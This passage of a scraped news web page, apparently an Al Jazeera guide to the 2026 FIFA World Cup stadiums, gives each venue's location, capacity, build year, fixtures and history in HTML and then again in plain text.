+⚽ 04/07: Round of 16 (1 pm ET/17:00 GMT)</p><p>The first NFL facility to have a retractable roof, the multipurpose venue is home to the league’s Houston Texans.</p><p>Houston Stadium is famous for its “Bull Pen” section, which houses the loudest section of the Texans’ home support.</p><p>The stadium also doubles up as a football venue. It has hosted an MLS All-Star game, national team fixtures of both the US and Mexico, as well as three games at the Copa America Centenario in 2016.</p><figure id="attachment_4342680" aria-describedby="caption-attachment-4342680"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/02/AP26035000226133-1772177362.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="An aerial view of the NRG Stadium, one of the stadiums that will host 2026 FIFA World Cup matches, in Houston, Dec. 28, 2025. The Astrodome is pictured on right. (AP Photo/Jon Shapley)" fetchpriority="low"/><figcaption id="caption-attachment-4342680">Houston Stadium hosted Super Bowls in 2004 and 2017 [File: Jon Shapley/AP Photo]</figcaption></figure><h2 id="5-kansas-city-stadium">5. Kansas City Stadium</h2><p><strong>Location</strong>: Kansas City, Missouri, US<br/>
+<strong>Capacity</strong>: 73,000<br/>
+<strong>Built</strong>: 1972<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 14/06: Argentina vs Algeria (9 pm ET/01:00 GMT next day)<br/>
+⚽ 20/06: Ecuador vs Curacao (8 pm ET/00:00 GMT next day)<br/>
+⚽ 25/06: Tunisia vs Netherlands (7 pm ET/23:00 GMT)<br/>
+⚽ 27/06: Algeria vs Austria (10 pm ET/02:00 GMT next day)<br/>
+⚽ 03/07: Group K winners vs Group D/E/I/J/L third place (9:30 pm ET/01:30 GMT next day)<br/>
+⚽ 11/07: Semifinal (9 pm ET/01:00 GMT next day)</p><p>Home to the NFL Kansas City Chiefs, this venue was certified by Guinness World Records as the loudest outdoor sports venue in the world for reaching a decibel level of 142.2 when the Chiefs took on the New England Patriots in 2014.</p><p>Commonly known as Arrowhead Field, this stadium has\xA0hosted a record five consecutive NFL Conference Championships from 2019 to 2023.</p><figure id="attachment_4342689" aria-describedby="caption-attachment-4342689"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/02/AP25353670800341-1772177732.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="FILE - A general overall interior view of GEHA Field at Arrowhead Stadium during the first half of an NFL football game between the Kansas City Chiefs and the Detroit Lions, Thursday, Sept. 7, 2023 in Kansas City, Mo. (AP Photo/Reed Hoffmann, File)" fetchpriority="low"/><figcaption id="caption-attachment-4342689">A general view of GEHA Field at Arrowhead Stadium during the first half of an NFL football game between the Kansas City Chiefs and the Detroit Lions, on Thursday, September 7, 2023, in Kansas City [File: Reed Hoffmann/AP]</figcaption></figure><h2 id="6-los-angeles-stadium">6. Los Angeles Stadium</h2><p><strong>Location</strong>: Inglewood, California, US<br/>
+<strong>Capacity</strong>: 70,000<br/>
+<strong>Built</strong>: 2020<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 12/06: USA vs Paraguay (9 pm ET/01:00 GMT next day)<br/>
+⚽ 15/06: Iran vs New Zealand (9 pm ET/01:00 GMT next day)<br/>
+⚽ 18/06: Switzerland vs Bosnia and Herzegovina (3 pm ET/19:00 GMT)<br/>
+⚽ 21/06: Belgium vs Iran (3 pm ET/19:00 GMT)<br/>
+⚽ 25/06: Turkiye vs USA (10 pm ET/02:00 GMT next day)<br/>
+⚽ 28/06: Group A runners-up v Group B runners-up (3 pm ET/19:00 GMT)<br/>
+⚽ 02/07: Group H winners v Group J runners-up (3 pm ET/19:00 GMT)<br/>
+⚽ 10/07: Quarterfinal (3 pm ET/19:00 GMT)</p><p>Opened only six years ago, the Los Angeles Stadium is the newest venue among the 16 World Cup venues.</p><p>Cohosts USA will play two of their three group games at the stadium, which is home to the NFL’s LA Rams and LA Chargers.</p><p>Los Angeles Stadium, also called SoFi Stadium for sponsorship reasons, will be involved during the 2028 LA Olympics, hosting the opening ceremony of the Summer Games.</p><figure id="attachment_4608711" aria-describedby="caption-attachment-4608711"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/05/AFP__20260512__B2NH2NT__v1__HighRes__FblWc2026StadiumLosAngeles-1779993012.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="Stadium Los Angeles Inglewood." fetchpriority="low"/><figcaption id="caption-attachment-4608711">The Los Angeles Stadium in Inglewood is known for hosting NFL home games of two LA-based teams [Patrick T Fallon/AFP]</figcaption></figure><h2 id="7-miami-stadium">7. Miami Stadium</h2><p><strong>Location</strong>: Miami Gardens, Florida, US<br/>
+<strong>Capacity</strong>:\xA065,000<br/>
+<strong>Built</strong>:\xA01987<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 15/06: Saudi Arabia vs Uruguay (6 pm ET/22:00 GMT)<br/>
+⚽ 21/06: Uruguay vs Cape Verde (6 pm ET/22:00 GMT)<br/>
+⚽ 24/06: Scotland vs Brazil (6 pm ET/22:00 GMT)<br/>
+⚽ 27/06: Colombia vs Portugal (7:30 pm ET/23:30 GMT)<br/>
+⚽ 03/07: Group J winners v Group H runners-up (6 pm ET/22:00 GMT)<br/>
+⚽ 11/07: Quarterfinals (5 pm ET/21:00 GMT)<br/>
+⚽ 18/07: Bronze final (5\xA0pm ET/21:00 GMT)</p><p>From hosting the NFL’s famous Miami Dolphins, to being the epicentre of the annual Formula One Miami Grand Prix, to staging the Miami Open tennis tournament, the Miami Stadium is the venue of choice for large-scale sporting events in this famous coastal city.</p><p>Six Super Bowls, multiple major concerts and international football matches have taken place at this venue, popularly called the Hard Rock Stadium.</p><figure id="attachment_3812163" aria-describedby="caption-attachment-3812163"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2025/07/GettyImages-2223092458-1751395250.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="A general view of the stadium prior to the FIFA Club World Cup 2025 round of 16 match between Real Madrid CF and Juventus FC" fetchpriority="low"/><figcaption id="caption-attachment-3812163">The Miami Stadium hosted eight matches during the 2025 Club World Cup, including the tournament opener [File: Hector Vivas/FIFA via Getty Images]</figcaption></figure><h2 id="8-new-york-new-jersey-stadium">8. New York/New Jersey Stadium</h2><p><strong>Location</strong>: East Rutherford, New Jersey, US<br/>
+<strong>Capacity</strong>:\xA082,500<br/>
+<strong>Built</strong>:\xA02010<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 13/06: Brazil vs Morocco (6 pm ET/22:00 GMT)<br/>
+⚽ 16/06: France vs Senegal (3 pm ET/19:00 GMT)<br/>
+⚽ 22/06: Norway vs Senegal (8 pm ET/00:00 GMT next day)<br/>
+⚽ 25/06: Ecuador vs Germany (4 pm ET/20:00 GMT)<br/>
+⚽ 27/06: Panama vs England (5 pm ET/21:00 GMT)<br/>
+⚽ 30/06: Group I winners v Group C/D/F/G/H third place (5 pm ET/21:00 GMT)<br/>
+⚽ 05/07: Round of 16 (4 pm ET/20:00 GMT)<br/>
+⚽ 19/07: Final (3 pm ET/19:00 GMT)</p><p>This huge multipurpose stadium, currently home to the NFL’s New York Giants and New York Jets, is the grand stage chosen to host eight matches, including the all-important World Cup final on July 19.</p><p>The New York/New Jersey Stadium, known as MetLife Stadium to fans, also hosted the 2025 FIFA Club World Cup final and both the semifinals.</p><p>New Jersey has long been an important cultural area for original rock and rap music creation, and this venue has hosted many A-list performers such as Beyonce, Ed Sheeran and Taylor Swift.</p><figure id="attachment_3839628" aria-describedby="caption-attachment-3839628"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2025/07/2025-07-13T213226Z_1812819983_UP1EL7D1NTZDW_RTRMADP_3_SOCCER-CLUB-CHE-PSG-1752603798.jpg?w=770&amp;resize=770%2C505&amp;quality=80" alt="stadium" fetchpriority="low"/><figcaption id="caption-attachment-3839628">The New York/New Jersey Stadium hosted several Club World Cup matches last year, including the final in which Chelsea beat Paris Saint-Germain [File: Jeenah Moon/Reuters]</figcaption></figure><h2 id="9-philadelphia-stadium">9. Philadelphia Stadium</h2><p><strong>Location</strong>: Philadelphia, Pennsylvania, US<br/>
+<strong>Capacity</strong>: 69,000<br/>
+<strong>Built</strong>: 2003<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 14/06: Ivory Coast vs Ecuador (7 pm ET/23:00 GMT)<br/>
+⚽ 19/06: Brazil vs Haiti (9 pm ET/01:00 GMT next day)<br/>
+⚽ 22/06: France vs Iraq (5 pm ET/21:00 GMT)<br/>
+⚽ 25/06: Curacao vs Ivory Coast (4 pm ET/20:00 GMT)<br/>
+⚽ 27/06: Croatia vs Ghana (5 pm ET/21:00 GMT)<br/>
+⚽ 04/07: Round of 16 (5 pm ET/21:00 GMT)</p><p>Home to the NFL Super Bowl LIX champions, Philadelphia Eagles, this stadium hosted eight games during the FIFA Club World Cup last year: six group matches, a round of 16 fixture and the quarterfinal, which featured Chelsea, the eventual champions.</p><p>The Philadelphia Stadium, commonly known as Lincoln Financial Field, is located on the banks of the Delaware River, and its first ticketed event took place in 2003 when Manchester United defeated Barcelona 3-1 in a friendly in front of more than 68,000 fans.</p><figure id="attachment_3802525" aria-describedby="caption-attachment-3802525"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2025/06/2025-06-27T003358Z_572085888_UP1EL6R01KKAC_RTRMADP_3_SOCCER-CLUB-RBS-RMA-1750984869.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="FIFA Club World Cup - Group H - RB Salzburg v Real Madrid - Lincoln Financial Field, Philadelphia, Pennsylvania, U.S. - June 26, 2025 General view inside the stadium before the match" fetchpriority="low"/><figcaption id="caption-attachment-3802525">Apart from hosting FIFA Club World Cup matches, the Philadelphia Stadium has also been the venue for the US national team’s games [File: Susana Vera/Reuters]</figcaption></figure><h2 id="10-san-francisco-bay-area-stadium">10. San Francisco Bay Area Stadium</h2><p><strong>Location</strong>: Santa Clara, California, US<br/>
+<strong>Capacity</strong>: 71,000<br/>
+<strong>Built</strong>: 2014<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 13/06: Qatar vs Switzerland (3 pm ET/19:00 GMT)<br/>
+⚽ 16/06: Austria vs Jordan (Midnight ET/04:00 GMT next day)<br/>
+⚽ 19/06: Turkiye vs Paraguay (Midnight ET/04:00 GMT next day)<br/>
+⚽ 22/06: Jordan vs Algeria (11 pm ET/03:00 GMT next day)<br/>
+⚽ 25/06: Paraguay vs Australia (10 pm ET/02:00 GMT next day)<br/>
+⚽ 01/07: Group D winners vs Group B/E/F/I/J third place (8 pm ET/00:00 GMT next day)</p><p>The home of the NFL San Francisco 49ers, this is one of the newer venues tasked to host World Cup matches this year. The stadium, mostly known as Levi’s Stadium, is located approximately 40 miles (64 km) south of San Francisco.</p><p>This venue hosted Super Bowls, with the latest in February when Puerto Rican megastar Bad Bunny headlined the half-time show.</p><figure id="attachment_4342861" aria-describedby="caption-attachment-4342861"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/02/AP26040130190110-1772183973.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="Fireworks ignite atop Levi&#39;s Stadium after the Seattle Seahawks defeat the New England Patriots in the NFL Super Bowl 60 football game, Sunday, Feb. 8, 2026, in Santa Clara, Calif. (AP Photo/Frank Franklin II)" fetchpriority="low"/><figcaption id="caption-attachment-4342861">Fireworks ignite atop San Francisco Bay Area Stadium after the Seattle Seahawks defeated the New England Patriots in the NFL Super Bowl 60 football game [File: Frank Franklin II/AP]</figcaption></figure><h2 id="11-seattle-stadium">11. Seattle Stadium</h2><p><strong>Location</strong>: Seattle, Washington, US<br/>
+<strong>Capacity</strong>:\xA069,000<br/>
+<strong>Built</strong>:\xA02002<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 15/06: Belgium vs Egypt (3 pm ET/19:00 GMT)<br/>
+⚽ 19/06: USA vs Australia (3 pm ET/19:00 GMT)<br/>
+⚽ 24/06: Bosnia and Herzegovina vs Qatar (3 pm ET/19:00 GMT)<br/>
+⚽ 26/06: Egypt vs Iran (11 pm ET/03:00 GMT next day)<br/>
+⚽ 01/07: Group G winners vs Group A/E/H/I/J third place (4 pm ET/20:00 GMT)<br/>
+⚽ 06/07: Round of 16 (8 pm ET/00:00 GMT next day)</p><p>This spectacular stadium is home to the MLS outfit Seattle Sounders as well as the NFL’s Seattle Seahawks and NWSL’s Seattle Reign.</p><p>Boasting a distinctive horseshoe shape with an open north end that offers a stunning view of the city skyline, the Seattle Stadium – commonly known as Lumen Field – hosted matches during the 2025 FIFA Club World Cup.</p><p>Located within a mile of downtown Seattle, the stadium is easily accessible by multiple freeways and public transport.</p><figure id="attachment_3748246" aria-describedby="caption-attachment-3748246"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2025/06/SEATTLE_2024-09-29T090518Z_2062731298_RC29AAAV11XL_RTRMADP_3_SOCCER-FIFA-CLUB-WORLDCUP-1748871666.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="Lumen Field." fetchpriority="low"/><figcaption id="caption-attachment-3748246">The Seattle Stadium featured twice in the Guinness World Records as the loudest outdoor stadium [File: Kirby Lee/USA Today Sports via Reuters]</figcaption></figure><h2 id="12-toronto-stadium">12. Toronto Stadium</h2><p><strong>Location</strong>: Toronto, Ontario, Canada<br/>
+<strong>Capacity</strong>: 45,000<br/>
+<strong>Built</strong>: 2007<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 12/06: Canada vs Bosnia and Herzegovina (3 pm ET/19:00 GMT)<br/>
+⚽ 17/06: Ghana vs Panama (7 pm ET/23:00 GMT)<br/>
+⚽ 20/06: Germany vs Ivory Coast (4 pm ET/20:00 GMT)<br/>
+⚽ 23/06: Panama vs Croatia (7 pm ET/23:00 GMT next day)<br/>
+⚽ 26/06: Senegal vs Iraq (3 pm ET/19:00 GMT)<br/>
+⚽ 02/07: Group K runners-up vs Group L runners-up (7 pm ET/23:00 GMT)</p><p>The Toronto Stadium will be the first Canadian venue to host a game at this year’s World Cup. The venue was purpose-built when Canada hosted the men’s U-20 World Cup in 2007, the tournament in which Argentina emerged champions, with a young Sergio Aguero winning the Golden Ball and Golden Boot.</p><p>The stadium, which also hosted the women’s U-20 World Cup in 2014, has an English Premier League-style roof canopy and steep stands on either end of the ground.</p><figure id="attachment_4455176" aria-describedby="caption-attachment-4455176"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/04/AFP__20260328__2268344373__v1__HighRes__CanadaVIcelandInternationalFriendly-1775106421.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="TORONTO, ON - MARCH 28: A general view during the International Friendly between Canada and Iceland at BMO Field on March 28, 2026 in Toronto, Ontario, Canada. Vaughn Ridley/Getty Images/AFP (Photo by Vaughn Ridley / GETTY IMAGES NORTH AMERICA / Getty Images via AFP)" fetchpriority="low"/><figcaption id="caption-attachment-4455176">The Toronto Stadium hosted pre-World Cup friendlies involving the Canada national team [File: Vaughn Ridley/Getty Images via AFP]</figcaption></figure><h2 id="13-bc-place-vancouver">13. BC Place Vancouver</h2><p><strong>Location</strong>: Vancouver, British Columbia, Canada<br/>
+<strong>Capacity</strong>: 54,000<br/>
+<strong>Built</strong>: 1983<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 13/06: Australia vs Turkiye (Midnight ET/04:00 GMT next day)<br/>
+⚽ 18/06: Canada vs Qatar (6 pm ET/22:00 GMT)<br/>
+⚽ 21/06: New Zealand vs Egypt (9 pm ET/01:00 GMT next day)<br/>
+⚽ 24/06: Switzerland vs Canada (3 pm ET/19:00 GMT)<br/>
+⚽ 26/06: New Zealand vs Belgium (11 pm local/03:00 GMT next day)<br/>
+⚽ 02/07: Group B winners vs Group E/F/G/I/J third place (11 pm local/03:00 GMT next day)<br/>
+⚽ 07/07: Round of 16 (4 pm local/20:00 GMT)</p><p>Situated on the banks of the False Creek inlet, BC Place Vancouver is a multipurpose stadium which hosts matches of MLS team Vancouver Whitecaps FC, the Canadian football team BC Lions and the annual Canada Sevens, part of the World Rugby Sevens Series.</p><p>Known for its iconic architecture, the venue is famously remembered for the 2015 Women’s World Cup final in which Carli Lloyd’s hat-trick guided the US to an emphatic victory over Japan.</p><p>At this year’s tournament, the venue will host two group games of the cohosts, Canada.</p><figure id="attachment_4339548" aria-describedby="caption-attachment-4339548"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/02/AP22166580920155-1772087776.jpg?w=770&amp;resize=770%2C449&amp;quality=80" alt="FILE - U.S. players run drills during a practice for the Women&#39;s World Cup soccer final under the open roof of BC Place in Vancouver, British Columbia, Canada, Saturday, July 4, 2015. There are 23 venues bidding to host soccer matches at the 2026 World Cup in the United States, Mexico and Canada.(AP Photo/Elaine Thompson)" fetchpriority="low"/><figcaption id="caption-attachment-4339548">The multipurpose BC Place is home to football, rugby sevens and Canadian football teams [File: Elaine Thompson/AP]</figcaption></figure><h2 id="14-mexico-city-stadium">14. Mexico City Stadium</h2><p><strong>Location</strong>: Mexico City, Mexico<br/>
+<strong>Capacity</strong>: 83,000<br/>
+<strong>Built</strong>: 1966<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 11/06: Mexico vs South Africa (3 pm ET/19:00 GMT)<br/>
+⚽ 17/06: Uzbekistan vs Colombia (10 pm ET/02:00 GMT next day)<br/>
+⚽ 24/06: Czechia vs Mexico (9 pm ET/01:00 GMT next day)<br/>
+⚽ 30/06: Group A winners vs Group C/E/F/H/I third place (9 pm ET/01:00 GMT next day)<br/>
+⚽ 05/07: Round of 16 (8 pm ET/00:00 GMT next day)</p><p>The renovated Estadio Azteca – now known as the Mexico City Stadium – will make history as the first to host three World Cups after welcoming the likes of Pele and Diego Maradona across two thrilling finals in 1970 and 1986.</p><p>The stadium will host the <a href="https://www.aljazeera.com/sports/2025/12/5/fifa-world-cup-2026-draw-groups-teams-format-trump-peace-prize">opening match</a> of the World Cup, as cohosts Mexico face South Africa on June 11 in a replay of the 2010 edition’s tournament opener. It will also host another group fixture of El Tri.</p><p>Sitting at an altitude of 2,200 metres (7,200 feet) above sea level, this venue is widely regarded as one of the most iconic stadiums in world football. It is the official home ground of the Mexico team, as well as Liga MX club Club America.</p><figure id="attachment_4608721" aria-describedby="caption-attachment-4608721"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2026/05/2026-05-16T033925Z_439147966_RC2V9LARE628_RTRMADP_3_SOCCER-WORLD-CUP-MEXICO-1779993370.jpg?w=770&amp;resize=770%2C557&amp;quality=80" alt="Mexico City Stadium." fetchpriority="low"/><figcaption id="caption-attachment-4608721">A drone view of Banorte Stadium, temporarily renamed Mexico City Stadium for the 2026 World Cup [File: Henry Romero/Reuters]</figcaption></figure><h2 id="15-estadio-guadalajara">15. Estadio Guadalajara</h2><p><strong>Location</strong>: Zapopan, Jalisco, Mexico<br/>
+<strong>Capacity</strong>: 48,000<br/>
+<strong>Built</strong>: 2010<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 11/06: South Korea vs Czechia (10 pm ET/02:00 GMT next day)<br/>
+⚽ 18/06: Mexico vs South Korea (9 pm ET/01:00 GMT next day)<br/>
+⚽ 23/06: Colombia vs Congo DR (10 pm ET/02:00 GMT next day)<br/>
+⚽ 26/06: Uruguay vs Spain (8 pm ET/00:00 GMT next day)</p><p>Commonly known as Estadio Akron, this multipurpose venue is mostly used for football games, serving as the home ground of Liga MX side CD Guadalajara.</p><p>Built on raised ground and with a spherical, coliseum-like design, Estadio Guadalajara is an eye-catching venue in North America. It also hosted a major youth tournament, the FIFA U-17 World Cup in 2011.</p><figure id="attachment_4155149" aria-describedby="caption-attachment-4155149"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2025/12/2025-12-03T122212Z_1523838402_RC2K5GAQBQUE_RTRMADP_3_SOCCER-WORLDCUP-STADIUMS-1765032139.jpg?w=770&amp;resize=770%2C433&amp;quality=80" alt="FILE PHOTO: Soccer Football - Akron Stadium in Guadalajara is one of Mexico&#39;s three venues for the 2026 World Cup - Guadalajara, Mexico - August 14, 2025 General aerial view of Akron Stadium will host four matches of the FIFA World Cup 2026 including Mexico&#39;s second group stage match. It was inaugurated in 2010 and has a capacity of 50,000 spectators. It has hosted Pan American Games events and a Copa Libertadores final. REUTERS/Daniel Becerril/File Photo" fetchpriority="low"/><figcaption id="caption-attachment-4155149">The Guadalajara Stadium has hosted Pan American Games events and a Copa Libertadores final [File: Daniel Becerril]</figcaption></figure><h2 id="16-estadio-monterrey">16. Estadio Monterrey</h2><p><strong>Location</strong>: Guadalupe, Nuevo Leon, Mexico<br/>
+<strong>Capacity</strong>: 53,500<br/>
+<strong>Built</strong>: 2015<br/>
+<strong>Fixtures</strong>:</p><p>⚽ 14/06: Sweden vs Tunisia (10 pm ET/02:00 GMT next day)<br/>
+⚽ 20/06: Tunisia vs Japan (Midnight ET/04:00 GMT next day)<br/>
+⚽ 24/06: South Africa vs South Korea (9 pm ET/01:00 GMT next day)<br/>
+⚽ 29/06: Group F winners vs Group C runners-up (9 pm ET/01:00 GMT next day)</p><p>The home of Liga MX side Monterrey, this stadium also hosted matches during the 2022 CONCACAF W Championship.</p><p>Known for its compact energy solutions and low-voltage equipment, Estadio Monterrey’s non-sporting activities include music concerts. Global sensations such as Bad Bunny, Shakira, Justin Bieber and the band Coldplay have performed here.</p><figure id="attachment_1932440" aria-describedby="caption-attachment-1932440"><img data-recalc-dims="1" loading="lazy" src="https://www.aljazeera.com/wp-content/uploads/2022/11/000_V21PL.jpg?w=770&amp;resize=770%2C513&amp;quality=80" alt="Unusual stadiums" fetchpriority="low"/><figcaption id="caption-attachment-1932440">The Estadio Monterrey is dubbed ‘El Gigante de Acero’, which means ‘the steel giant’ in Spanish [File: Alfredo Estrella/AFP]</figcaption></figure><p><em>The FIFA World Cup begins on June 11. You can follow the action on Al Jazeera’s dedicated\xA0<a href="https://www.aljazeera.com/fifa-world-cup-2026/">World Cup 2026</a>\xA0page with all the latest news, match build-up and live text commentary, and keep up to date with group standings, real-time match results and schedules.</em></p></div></div>`,content_text:`Football’s biggest tournament returns as the FIFA World Cup 2026 unfolds across three countries.The United States, Mexico and Canada will host matches from June 11 to July 19, with an expanded pool of 48 teams fighting to be crowned world champions.Recommended Stories list of 4 itemslist 1 of 4From Yildiz to Diomande: Top 10 rising stars to watch at the World Cuplist 2 of 4US artist sues FIFA over destruction of Dallas whale mural for World Cuplist 3 of 4World Cup contenders: Are Morocco ready to go all the way this time?list 4 of 4Lamine Yamal and Nico Williams set to be fit for Spain’s World Cup openerend of listHere is a detailed breakdown of the 16 stadium venues and 16 cities hosting the event, stretching from Boston, located in the far east of the US, to Vancouver on the west coast of Canada, and to Guadalajara in central Mexico.Al Jazeera also has a virtual tour of all the World Cup 2026 stadiums.Stadium and host cities guide: FIFA World Cup 20261. Atlanta StadiumLocation: Atlanta, Georgia, US
+Capacity:\xA075,000
+Built:\xA02017
+Fixtures:⚽ 15/06: Spain vs Cape Verde (12 pm ET/16:00 GMT)
+⚽ 18/06: Czechia vs South Africa (12 pm ET/16:00 GMT)
+⚽ 21/06: Spain vs Saudi Arabia (12 pm ET/16:00 GMT)
+⚽ 24/06: Morocco vs Haiti (6 pm ET/22:00 GMT)
+⚽ 27/06: Congo DR vs Uzbekistan (7:30 pm ET/23:30 GMT)
+⚽ 01/07: Group L winners vs Group E/H/I/J/K third place (12 pm ET/16:00 GMT)
+⚽ 07/07: Round of 16 (12 pm ET/16:00 GMT)
+⚽ 15/07: Semifinal (3 pm ET/19:00 GMT)This southern US city of more than 500,000 people is famous for another kind of football (American college football), home to the Atlanta United Major League Soccer (MLS) team, and the site of undoubtedly the most space-age stadium architecture of the host cities, the Atlanta Stadium.Eight FIFA World Cup 2026 fixtures will take place in Atlanta, including a semifinal and two other knockout games. Spain, the pre-tournament favourites and reigning European champions, will play two group games here.The venue, called the Mercedes-Benz Stadium due to sponsorship, hosted six FIFA Club World Cup matches last year. It boasts a retractable roof and a 360-degree halo video display.Atlanta Stadium also hosts the professional NFL team, the Atlanta Falcons, ice hockey and music concerts [File: Kirby Lee/USA TODAY Sports via Reuters]2. Boston StadiumLocation: Foxborough, Massachusetts, US
+Capacity: 65,000
+Built: 2002
+Fixtures:⚽ 13/06: Haiti vs Scotland (9 pm ET/01:00 GMT next day)
+⚽ 16/06: Iraq vs Norway (6 pm ET/22:00 GMT)
+⚽ 19/06: Scotland vs Morocco (6 pm ET/22:00 GMT)
+⚽ 23/06: England vs Ghana (4 pm ET/20:00 GMT)
+⚽ 26/06: Norway vs France (3 pm ET/19:00 GMT)
+⚽ 29/06: Group E winners vs Group A/B/C/D/F third place (4:30 pm ET/20:30 GMT)
+⚽ 09/07: Round of 16 (4 pm ET/20:00 GMT)Located 22 miles (35 km) southwest of Downtown Boston, this multipurpose stadium serves as the home turf of the National Football League’s (NFL’s) New England Patriots and the MLS’s New England Revolution. The venue has hosted several major tournaments, including the FIFA Women’s World Cup 2003, the Copa America Centenario, and the CONCACAF Gold Cup.Boston Stadium – commonly known as Gillette Stadium to fans – underwent a major renovation project ahead of the World Cup, with the ground now boasting the largest outdoor high-definition stadium video board in the country (measuring 22,000 square feet).A general view of Gillette Stadium during the first half of an NFL game [File: Greg M Cooper/AP Photo]3. Dallas StadiumLocation: Arlington, Texas, US
+Capacity: 94,000
+Built: 2009
+Fixtures:⚽ 14/06: Netherlands vs Japan (4 pm ET/20:00 GMT)
+⚽ 17/06: England vs Croatia (4 pm ET/20:00 GMT)
+⚽ 22/06: Argentina vs Austria (1 pm ET/17:00 GMT)
+⚽ 25/06: Japan vs Sweden (7 pm ET/23:00 GMT)
+⚽ 27/06: Jordan vs Argentina (10 pm ET/02:00 GMT next day)
+⚽ 30/06: Group E runners-up vs Group I runners-up (1 pm ET/17:00 GMT)
+⚽ 03/07: Group D runners-up vs Group G runners-up (2 pm ET/18:00 GMT)
+⚽ 06/07: Round of 16 (3 pm ET/19:00 GMT)
+⚽ 14/07: Semifinal (3 pm ET/19:00 GMT)The biggest stadium of the 2026 World Cup, this venue boasts a whopping 94,000 seats and 25,000 square feet (2,300 square metres) of video displays inside.It will host the most World Cup matches (nine): five group games – including two of defending world champions Argentina – and four knockout ties, which feature a semifinal.Since opening in 2009, the Dallas Stadium has been the home of the five-time Super Bowl champions Dallas Cowboys and has also hosted the CONCACAF Gold Cup and Mexico national team matches.The stadium is widely referred to as Jerry World after Dallas Cowboys owner Jerry Jones, who originally envisioned it as a large entertainment venue.Dallas Stadium, commonly known as AT&T Stadium, has been the home of the NFL’s Dallas Cowboys since 2009 [File: Jeffrey McWhorter/AP Photo]4. Houston StadiumLocation: Houston, Texas, US
+Capacity: 72,000
+Built: 2002
+Fixtures:⚽ 14/06: Germany vs Curacao (1 pm ET/17:00 GMT)
+⚽ 17/06: Portugal vs Congo DR (1 pm ET/17:00 GMT)
+⚽ 20/06: Netherlands vs Sweden (1 pm ET/17:00 GMT)
+⚽ 23/06: Portugal vs Uzbekistan (1 pm ET/17:00 GMT)
+⚽ 26/06: Cape Verde vs Saudi Arabia (8 pm ET/00:00 GMT next day)
+⚽ 29/06: Group C winners vs Group F runners-up (1 pm ET/17:00 GMT)
+⚽ 04/07: Round of 16 (1 pm ET/17:00 GMT)The first NFL facility to have a retractable roof, the multipurpose venue is home to the league’s Houston Texans.Houston Stadium is famous for its “Bull Pen” section, which houses the loudest section of the Texans’ home support.The stadium also doubles up as a football venue. It has hosted an MLS All-Star game, national team fixtures of both the US and Mexico, as well as three games at the Copa America Centenario in 2016.Houston Stadium hosted Super Bowls in 2004 and 2017 [File: Jon Shapley/AP Photo]5. Kansas City StadiumLocation: Kansas City, Missouri, US
+Capacity: 73,000
+Built: 1972
+Fixtures:⚽ 14/06: Argentina vs Algeria (9 pm ET/01:00 GMT next day)
+⚽ 20/06: Ecuador vs Curacao (8 pm ET/00:00 GMT next day)
+⚽ 25/06: Tunisia vs Netherlands (7 pm ET/23:00 GMT)
+⚽ 27/06: Algeria vs Austria (10 pm ET/02:00 GMT next day)
+⚽ 03/07: Group K winners vs Group D/E/I/J/L third place (9:30 pm ET/01:30 GMT next day)
+⚽ 11/07: Semifinal (9 pm ET/01:00 GMT next day)Home to the NFL Kansas City Chiefs, this venue was certified by Guinness World Records as the loudest outdoor sports venue in the world for reaching a decibel level of 142.2 when the Chiefs took on the New England Patriots in 2014.Commonly known as Arrowhead Field, this stadium has\xA0hosted a record five consecutive NFL Conference Championships from 2019 to 2023.A general view of GEHA Field at Arrowhead Stadium during the first half of an NFL football game between the Kansas City Chiefs and the Detroit Lions, on Thursday, September 7, 2023, in Kansas City [File: Reed Hoffmann/AP]6. Los Angeles StadiumLocation: Inglewood, California, US
+Capacity: 70,000
+Built: 2020
+Fixtures:⚽ 12/06: USA vs Paraguay (9 pm ET/01:00 GMT next day)
+⚽ 15/06: Iran vs New Zealand (9 pm ET/01:00 GMT next day)
+⚽ 18/06: Switzerland vs Bosnia and Herzegovina (3 pm ET/19:00 GMT)
+⚽ 21/06: Belgium vs Iran (3 pm ET/19:00 GMT)
+⚽ 25/06: Turkiye vs USA (10 pm ET/02:00 GMT next day)
+⚽ 28/06: Group A runners-up v Group B runners-up (3 pm ET/19:00 GMT)
+⚽ 02/07: Group H winners v Group J runners-up (3 pm ET/19:00 GMT)
